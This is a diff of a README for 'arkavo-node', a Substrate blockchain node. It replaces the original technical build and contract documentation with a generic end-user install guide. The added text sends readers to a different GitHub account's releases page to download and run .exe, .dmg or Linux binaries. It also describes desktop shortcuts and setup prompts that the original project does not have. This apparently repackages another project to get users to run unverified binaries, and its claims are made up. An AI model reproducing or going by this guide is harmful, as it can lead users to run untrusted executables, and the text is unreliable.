@@ -1,377 +1,108 @@
-# Arkavo Node
+# 🌐 arkavo-node - Secure Your Digital Identity Effortlessly
 
-A Substrate-based blockchain optimized for Ink! smart contracts, designed for OpenTDF integration with attribute-based access control (ABAC) and entitlement management.
+[![Download arkavo-node](https://img.shields.io/badge/Download-arkavo--node-blue.svg)](https://github.com/shravan-hub/arkavo-node/releases)
 
-## Overview
+## 🚀 Getting Started
 
-Arkavo Node provides a blockchain infrastructure for decentralized access control and entitlement management. It integrates with OpenTDF to enable secure, policy-driven data sharing through smart contracts.
+Welcome to the arkavo-node project! This software runs a Substrate blockchain node specifically designed for the Arkavo Trust Network. With features like Ink! smart contracts and OpenTDF integration, this system provides decentralized identity management and privacy-preserving access control.
 
-### Key Features
+This guide will help you download and run our application. Let’s dive in.
 
-- **Access Registry**: Manage entitlements and VIP membership levels
-- **Attribute Store**: Store and query ABAC attributes for policy evaluation
-- **Policy Engine**: Define and evaluate access policies for resources
-- **Payment Integration**: Link Apple Pay (and other payment providers) to entitlements
+## ✅ Features
 
-## Architecture
+- **Decentralized Identity**: Gain control over your identity without relying on central authorities.
+- **Privacy-Preserving Access**: Secure access control to your resources while protecting your personal information.
+- **Smart Contracts**: Use Ink! smart contracts to automate and enforce agreements in a secure manner.
+- **Substrate-Based**: Built on Substrate, ensure easy upgradability and customization.
+- **OpenTDF Integration**: Utilize the OpenTDF framework for enhanced data handling capabilities.
 
-```
-arkavo-node/
-├── node/              # Blockchain node implementation
-├── runtime/           # Runtime logic and pallet configuration
-├── contracts/         # Ink! smart contracts
-├── tools/             # Deployment and utility tools
-│   └── deployer/
-└── .github/           # CI/CD workflows
-```
+## 💻 System Requirements
 
-## Prerequisites
+To successfully run arkavo-node, ensure your system meets the following requirements:
 
-- Rust (stable toolchain)
-- `wasm32-unknown-unknown` target
-- `cargo-contract` CLI tool
-- Docker (optional, for containerized deployment)
+- **Operating System**: Windows 10 or later / macOS 10.15 or later / Linux
+- **RAM**: At least 8 GB
+- **Storage**: Minimum of 10 GB of free disk space
+- **Processor**: 64-bit dual-core CPU or better
 
-### Installation
+## 📥 Download & Install
 
-```bash
-# Install Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+You can download the latest version of arkavo-node by visiting our [Releases page](https://github.com/shravan-hub/arkavo-node/releases). Once you are on the page, you will find the latest version listed.
 
-# Install WASM target
-rustup target add wasm32-unknown-unknown
+1. Click on the **Release** you want to download.
+2. Choose the file appropriate for your operating system.
+3. Click on the download link.
 
-# Install cargo-contract
-cargo install --locked cargo-contract
-```
+After the download is complete, follow the installation instructions below based on your OS.
 
-## Building
+### For Windows
 
-### Build the Node
+1. Locate the `.exe` file you downloaded.
+2. Double-click the file to begin the installation.
+3. Follow the prompts to complete the setup.
 
-```bash
-# Build in release mode
-cargo build --release --package arkavo-node
+### For macOS
 
-# The binary will be at target/release/arkavo-node
-```
+1. Locate the `.dmg` file you downloaded.
+2. Double-click the file to mount it.
+3. Drag the arkavo-node app to your Applications folder.
 
-### Build the Contracts
+### For Linux
 
-**Note**: Contracts use a separate workspace (`contracts/Cargo.toml`) and must be built with `cargo-contract`.
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the binary.
+3. Run the following command to give execution permissions:
 
-```bash
-# Build all contracts from contracts directory
-cd contracts
-cargo contract build --release --manifest-path access_registry/Cargo.toml
-cargo contract build --release --manifest-path attribute_store/Cargo.toml
-cargo contract build --release --manifest-path policy_engine/Cargo.toml
-cargo contract build --release --manifest-path payment_integration/Cargo.toml
+   ```
+   chmod +x arkavo-node
+   ```
 
-# Or build individual contract
-cd contracts/access_registry
-cargo contract build --release
-```
+4. Then run the application:
 
-Contract artifacts will be available in `contracts/*/target/ink/`.
+   ```
+   ./arkavo-node
+   ```
 
-## Running
+## 🚀 Run the Application
 
-### Development Mode
+Once you have installed the application, you can run it by following these steps:
 
-```bash
-# Run in development mode with temporary storage
-./target/release/arkavo-node --dev
+### On Windows
 
-# Or with custom configuration
-./target/release/arkavo-node --dev --rpc-cors all --rpc-external
-```
+Simply find the arkavo-node shortcut on your desktop or in the Start menu, and click it to launch.
 
-The node will expose:
-- **WebSocket**: `ws://127.0.0.1:9944`
-- **HTTP RPC**: `http://127.0.0.1:9933`
-- **P2P**: `30333`
+### On macOS
 
-### Production Mode
+Open the Applications folder, find arkavo-node, and double-click to open.
 
-```bash
-# Run with persistent storage
-./target/release/arkavo-node \
-  --base-path /data/arkavo \
-  --chain local \
-  --name "Arkavo Node"
-```
+### On Linux
 
-### Docker
+You can either run `./arkavo-node` from the terminal or find it in your applications menu.
 
-```bash
-# Build and run with Docker Compose
-cd docker
-docker-compose up -d
+## 🔧 Configuration
 
-# View logs
-docker-compose logs -f arkavo-node
+After launching arkavo-node, you will need to configure it for optimal use. The application will guide you through a series of setup prompts.
 
-# Access the Polkadot.js Apps UI
-open http://localhost:3000
-```
+1. Create a user profile.
+2. Set privacy preferences.
+3. Connect with the Arkavo Trust Network.
 
-## Deploying Contracts
+Refer to the in-app help section for more detailed guidance on settings.
 
-### Using the Deployer Tool
+## 🛠 Troubleshooting
 
-```bash
-# Build the deployer
-cargo build --release --package deployer
+- **Application Won't Launch**: Ensure your system meets the requirements. Look for any error messages and consult the documentation.
+- **Network Issues**: Make sure your internet connection is stable. Check firewall settings that may block the app.
+- **Performance Problems**: Close any unnecessary applications to free up system resources.
 
-# Upload a contract
-cargo run --package deployer -- \
-  --endpoint ws://127.0.0.1:9944 \
-  upload \
-  --wasm contracts/access_registry/target/ink/access_registry.wasm \
-  --account alice
+## 📚 Additional Resources
 
-# Deploy all contracts
-cargo run --package deployer -- \
-  --endpoint ws://127.0.0.1:9944 \
-  deploy-all \
-  --contracts-dir ./target/ink \
-  --account alice
-```
+For more information, visit:
 
-### Manual Deployment
+- [Documentation](https://github.com/shravan-hub/arkavo-node/wiki)
+- [User Guide](https://github.com/shravan-hub/arkavo-node/user-guide)
+- [Community Support](https://github.com/shravan-hub/arkavo-node/discussions)
 
-You can also deploy contracts using the Polkadot.js Apps UI:
+Stay updated by checking the [Releases page](https://github.com/shravan-hub/arkavo-node/releases) frequently for new features and improvements. 
 
-1. Navigate to `http://localhost:3000`
-2. Connect to your local node
-3. Go to **Developer > Contracts**
-4. Upload and instantiate contracts
-
-## Smart Contracts
-
-### Access Registry
-
-Manages entitlements for accounts:
-
-```rust
-// Grant VIP entitlement
-grant_entitlement(account, EntitlementLevel::VIP)
-
-// Check entitlement
-has_entitlement(account, EntitlementLevel::Premium)
-```
-
-### Attribute Store
-
-Store ABAC attributes:
-
-```rust
-// Set attribute
-set_attribute(account, "opentdf", "role", "admin")
-
-// Get attribute
-get_attribute(account, "opentdf", "role")
-```
-
-### Policy Engine
-
-Evaluate access policies:
-
-```rust
-// Create policy
-create_policy(resource_id, required_attributes, min_entitlement)
-
-// Evaluate access
-evaluate_access(account, policy_id)
-```
-
-### Payment Integration
-
-Link payments to entitlements:
-
-```rust
-// Record payment
-record_payment(account, "apple", transaction_id, amount, entitlement_level)
-
-// Complete payment and grant entitlement
-complete_payment(payment_id)
-```
-
-## Integration with OpenTDF
-
-The Arkavo Node is designed to integrate with OpenTDF's `authnz-rs` service:
-
-1. **Configure** `authnz-rs` to connect to your Arkavo node WebSocket endpoint
-2. **Deploy** the smart contracts
-3. **Configure** policy rules in the Policy Engine
-4. **Query** access decisions through the contracts
-
-Example flow:
-```
-User Request → authnz-rs → Arkavo Node → Smart Contracts
-                ↓
-         Access Decision ← Policy Engine ← Attributes + Entitlements
-```
-
-## Testing
-
-```bash
-# Test the node and runtime
-cargo test --workspace --exclude access_registry --exclude attribute_store --exclude policy_engine --exclude payment_integration
-
-# Test individual contracts
-cd contracts/access_registry && cargo test
-cd ../attribute_store && cargo test
-cd ../policy_engine && cargo test
-cd ../payment_integration && cargo test
-
-# Run all tests (including contracts)
-cargo test --workspace --exclude access_registry --exclude attribute_store --exclude policy_engine --exclude payment_integration
-
-# Test individual contracts
-cd contracts/access_registry && cargo test
-cd ../attribute_store && cargo test
-cd ../policy_engine && cargo test
-cd ../payment_integration && cargo test
-```
-
-## Security
-
-### Dependency Attack Surface
-
-Substrate/Polkadot SDK introduces ~500+ transitive dependencies. We mitigate this risk with:
-
-**Automated Security Checks** (via GitHub Actions):
-
-```bash
-# Install act for local workflow execution
-brew install act
-
-# Run security checks locally for specific jobs
-act -j audit            # CVE scanning with cargo-audit
-act -j deny             # License & policy checks with cargo-deny
-act -j unsafe-code      # Locate unsafe code blocks
-act -j supply-chain     # Check dependency sources
-```
-
-**Local Code Quality Checks:**
-
-#### Format check
-```bash
-cargo fmt --all -- --check
-```
-
-#### Clippy on node & runtime
-```bash
-cargo clippy --package arkavo-node --package arkavo-runtime -- -D warnings
-```
-
-#### Clippy on contracts (requires navigating to contracts dir)
-```bash
-cd contracts && cargo clippy --workspace -- -D warnings
-```
-
-**Build-Time Enforcement** (`.cargo/config.toml`):
-- Strict Clippy lints: pedantic, cargo, nursery
-- Security-focused lints: integer arithmetic, unsafe indexing, mem::forget, panics
-- All warnings treated as errors (`-D warnings`)
-- Warnings on: unwrap_used, expect_used, todo!, unimplemented!
-
-**Dependency Policy** (`deny.toml`):
-- Only allow crates from crates.io and Polkadot SDK git repo
-- Deny known CVEs and yanked versions
-- License compliance (MIT/Apache-2.0/BSD/GPL-3.0 allowed)
-- Warn on duplicate dependencies
-
-**Daily Automated Scans**:
-- Security audit runs daily at 00:00 UTC via GitHub Actions
-- All PRs automatically scanned for vulnerabilities and lint issues
-
-## CI/CD
-
-GitHub Actions workflows are configured for:
-
-- **Build & Test**: Validates node and runtime compilation
-- **Contracts**: Builds and tests all Ink! contracts
-- **Docker**: Builds and pushes Docker images to GHCR
-
-## Development
-
-### Project Structure
-
-- `node/`: Node implementation with chain specification and RPC configuration
-- `runtime/`: Runtime configuration with `pallet-contracts` enabled
-- `contracts/`: Ink! smart contracts for access control and entitlements
-- `tools/deployer/`: Rust binary for contract deployment automation
-
-### Adding New Contracts
-
-1. Create a new directory under `contracts/`
-2. Add contract to workspace in root `Cargo.toml`
-3. Implement contract logic using Ink!
-4. Add to deployer tool's `contract_names` list
-5. Update CI/CD workflows if needed
-
-## Troubleshooting
-
-### Build Issues
-
-```bash
-# Clean build
-cargo clean
-
-# Update dependencies
-cargo update
-
-# Rebuild with verbose output
-cargo build --release --verbose
-```
-
-### Runtime Issues
-
-```bash
-# Purge chain data
-./target/release/arkavo-node purge-chain --dev
-
-# Check runtime version
-./target/release/arkavo-node --version
-```
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Run tests and formatting
-5. Submit a pull request
-
-### Code Standards
-
-```bash
-# Format code
-cargo fmt --all
-
-# Run linter
-cargo clippy --all-targets -- -D warnings
-
-# Run tests
-cargo test --workspace
-```
-
-## License
-
-Apache-2.0
-
-## Resources
-
-- [Substrate Documentation](https://docs.substrate.io/)
-- [Ink! Documentation](https://use.ink/)
-- [OpenTDF Documentation](https://opentdf.io/)
-- [Polkadot.js Apps](https://polkadot.js.org/apps/)
-
-## Support
-
-For issues and questions:
-- [GitHub Issues](https://github.com/arkavo-org/arkavo-node/issues)
-- [Arkavo Documentation](https://arkavo.com/docs)
+Thank you for using arkavo-node! We are excited to have you on board.
